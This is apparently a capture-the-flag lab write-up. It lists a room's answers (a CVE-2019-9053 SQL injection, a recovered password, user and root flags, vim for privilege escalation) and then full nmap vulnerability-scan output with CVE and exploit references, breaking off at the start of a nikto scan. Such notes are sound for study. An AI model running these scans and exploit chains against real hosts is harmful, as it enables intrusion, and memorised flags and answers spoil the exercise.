@@ -1,0 +1,458 @@
+How many services are running under port 1000?
+    -> 2
+
+What is running on the higher port?
+    -> ssh
+
+What's the CVE you're using against the application?
+    -> CVE-2019-9053
+
+To what kind of vulnerability is the application vulnerable?
+    -> SQLi
+
+What's the password?
+    -> secret
+
+Where can you login with the details obtained?
+    -> ssh
+
+What's the user flag?
+    -> G00d j0b, keep up!
+
+Is there any other user in the home directory? What's its name?
+    -> sunbath
+
+What can you leverage to spawn a privileged shell?
+    -> vim
+
+What's the root flag?
+    -> W3ll d0n3. You made it!
+
+
+
+
+================================================================================
+
+NMAP SCAN:
+=-=-=-=-=-=
+
+└──╼ $sudo nmap -sV -O --script=vuln 10.10.202.53
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 02:13 PKT
+Nmap scan report for 10.10.202.53
+Host is up (0.44s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+|_sslv2-drown: 
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|_  /robots.txt: Robots file
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_      http://ha.ckers.org/slowloris/
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.18: 
+|     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
+|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
+|     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
+|     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
+|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
+|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	*EXPLOIT*
+|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	*EXPLOIT*
+|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
+|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
+|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
+|     	MSF:ILITIES/UBUNTU-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/	*EXPLOIT*
+|     	MSF:ILITIES/UBUNTU-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/SUSE-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/FREEBSD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/DEBIAN-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	*EXPLOIT*
+|     	MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	*EXPLOIT*
+|     	MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	*EXPLOIT*
+|     	CVE-2020-35452	6.8	https://vulners.com/cve/CVE-2020-35452
+|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
+|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
+|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
+|     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
+|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
+|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
+|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
+|     	EDB-ID:47689	5.8	https://vulners.com/exploitdb/EDB-ID:47689	*EXPLOIT*
+|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
+|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
+|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
+|     	CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387
+|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
+|     	MSF:ILITIES/UBUNTU-CVE-2018-1333/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/	*EXPLOIT*
+|     	MSF:ILITIES/UBUNTU-CVE-2018-1303/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/	*EXPLOIT*
+|     	MSF:ILITIES/UBUNTU-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/	*EXPLOIT*
+|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	*EXPLOIT*
+|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	*EXPLOIT*
+|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	*EXPLOIT*
+|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	*EXPLOIT*
+|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	*EXPLOIT*
+|     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
+|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
+|     	EXPLOITPACK:2666FB0676B4B582D689921651A30355	5.0	https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355	*EXPLOIT*
+|     	EDB-ID:40909	5.0	https://vulners.com/exploitdb/EDB-ID:40909	*EXPLOIT*
+|     	CVE-2021-33193	5.0	https://vulners.com/cve/CVE-2021-33193
+|     	CVE-2021-26690	5.0	https://vulners.com/cve/CVE-2021-26690
+|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
+|     	CVE-2019-17567	5.0	https://vulners.com/cve/CVE-2019-17567
+|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
+|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
+|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
+|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
+|     	CVE-2018-1333	5.0	https://vulners.com/cve/CVE-2018-1333
+|     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
+|     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
+|     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
+|     	CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743
+|     	CVE-2016-8740	5.0	https://vulners.com/cve/CVE-2016-8740
+|     	CVE-2016-4979	5.0	https://vulners.com/cve/CVE-2016-4979
+|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573	*EXPLOIT*
+|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	4.9	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	*EXPLOIT*
+|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
+|     	MSF:ILITIES/UBUNTU-CVE-2018-1302/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/	*EXPLOIT*
+|     	MSF:ILITIES/UBUNTU-CVE-2018-1301/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	*EXPLOIT*
+|     	MSF:ILITIES/DEBIAN-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/	*EXPLOIT*
+|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	*EXPLOIT*
+|     	MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	*EXPLOIT*
+|     	EDB-ID:47688	4.3	https://vulners.com/exploitdb/EDB-ID:47688	*EXPLOIT*
+|     	CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985
+|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
+|     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
+|     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
+|     	CVE-2018-11763	4.3	https://vulners.com/cve/CVE-2018-11763
+|     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
+|     	CVE-2016-1546	4.3	https://vulners.com/cve/CVE-2016-1546
+|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
+|     	MSF:ILITIES/UBUNTU-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/	*EXPLOIT*
+|     	MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	*EXPLOIT*
+|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	*EXPLOIT*
+|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	*EXPLOIT*
+|     	MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	*EXPLOIT*
+|     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
+|     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
+|     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441*EXPLOIT*
+|     	EDB-ID:46676	0.0	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
+|     	EDB-ID:42745	0.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
+|     	1337DAY-ID-663	0.0	https://vulners.com/zdt/1337DAY-ID-663	*EXPLOIT*
+|     	1337DAY-ID-601	0.0	https://vulners.com/zdt/1337DAY-ID-601	*EXPLOIT*
+|     	1337DAY-ID-4533	0.0	https://vulners.com/zdt/1337DAY-ID-4533	*EXPLOIT*
+|     	1337DAY-ID-3109	0.0	https://vulners.com/zdt/1337DAY-ID-3109	*EXPLOIT*
+|_    	1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237	*EXPLOIT*
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| vulners: 
+|   cpe:/a:openbsd:openssh:7.2p2: 
+|     	PACKETSTORM:140070	7.8	https://vulners.com/packetstorm/PACKETSTORM:140070*EXPLOIT*
+|     	EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	7.8	https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	*EXPLOIT*
+|     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
+|     	CVE-2016-8858	7.8	https://vulners.com/cve/CVE-2016-8858
+|     	CVE-2016-6515	7.8	https://vulners.com/cve/CVE-2016-6515
+|     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494	*EXPLOIT*
+|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
+|     	CVE-2016-10009	7.5	https://vulners.com/cve/CVE-2016-10009
+|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
+|     	SSV:92582	7.2	https://vulners.com/seebug/SSV:92582	*EXPLOIT*
+|     	CVE-2016-10012	7.2	https://vulners.com/cve/CVE-2016-10012
+|     	CVE-2015-8325	7.2	https://vulners.com/cve/CVE-2015-8325
+|     	SSV:92580	6.9	https://vulners.com/seebug/SSV:92580	*EXPLOIT*
+|     	CVE-2016-10010	6.9	https://vulners.com/cve/CVE-2016-10010
+|     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577	*EXPLOIT*
+|     	MSF:ILITIES/UBUNTU-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/SUSE-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/SUSE-CVE-2019-25017/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/	*EXPLOIT*
+|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/IBM-AIX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/DEBIAN-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	*EXPLOIT*
+|     	MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	*EXPLOIT*
+|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
+|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
+|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
+|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
+|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
+|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
+|     	SSV:91041	5.5	https://vulners.com/seebug/SSV:91041	*EXPLOIT*
+|     	PACKETSTORM:140019	5.5	https://vulners.com/packetstorm/PACKETSTORM:140019*EXPLOIT*
+|     	PACKETSTORM:136234	5.5	https://vulners.com/packetstorm/PACKETSTORM:136234*EXPLOIT*
+|     	EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	5.5	https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	*EXPLOIT*
+|     	EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	5.5	https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	*EXPLOIT*
+|     	EXPLOITPACK:1902C998CBF9154396911926B4C3B330	5.5	https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330	*EXPLOIT*
+|     	EDB-ID:40858	5.5	https://vulners.com/exploitdb/EDB-ID:40858	*EXPLOIT*
+|     	CVE-2016-3115	5.5	https://vulners.com/cve/CVE-2016-3115
+|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
+|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621*EXPLOIT*
+|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
+|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
+|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
+|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
+|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
+|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
+|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
+|     	CVE-2016-10708	5.0	https://vulners.com/cve/CVE-2016-10708
+|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
+|     	EDB-ID:45233	4.6	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
+|     	EDB-ID:40963	4.6	https://vulners.com/exploitdb/EDB-ID:40963	*EXPLOIT*
+|     	EDB-ID:40962	4.6	https://vulners.com/exploitdb/EDB-ID:40962	*EXPLOIT*
+|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
+|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
+|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
+|     	EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	*EXPLOIT*
+|     	EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	*EXPLOIT*
+|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
+|     	CVE-2016-6210	4.3	https://vulners.com/cve/CVE-2016-6210
+|     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440	*EXPLOIT*
+|     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438	*EXPLOIT*
+|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
+|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
+|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
+|     	SSV:92581	2.1	https://vulners.com/seebug/SSV:92581	*EXPLOIT*
+|     	CVE-2016-10011	2.1	https://vulners.com/cve/CVE-2016-10011
+|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227*EXPLOIT*
+|     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261*EXPLOIT*
+|     	PACKETSTORM:138006	0.0	https://vulners.com/packetstorm/PACKETSTORM:138006*EXPLOIT*
+|     	PACKETSTORM:137942	0.0	https://vulners.com/packetstorm/PACKETSTORM:137942*EXPLOIT*
+|     	EDB-ID:46193	0.0	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
+|     	EDB-ID:40136	0.0	https://vulners.com/exploitdb/EDB-ID:40136	*EXPLOIT*
+|     	EDB-ID:40113	0.0	https://vulners.com/exploitdb/EDB-ID:40113	*EXPLOIT*
+|     	EDB-ID:39569	0.0	https://vulners.com/exploitdb/EDB-ID:39569	*EXPLOIT*
+|     	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
+|_    	1337DAY-ID-10010	0.0	https://vulners.com/zdt/1337DAY-ID-10010	*EXPLOIT*
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 371.83 seconds
+
+
+============================================================================================================================
+
+NIKTO SCAN:
+=-=-=-=-=-=
+
+───╼ $nikto -h 10.10.209.25
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.209.25
++ Target Hostname:    10.10.209.25
++ Target Port:        80
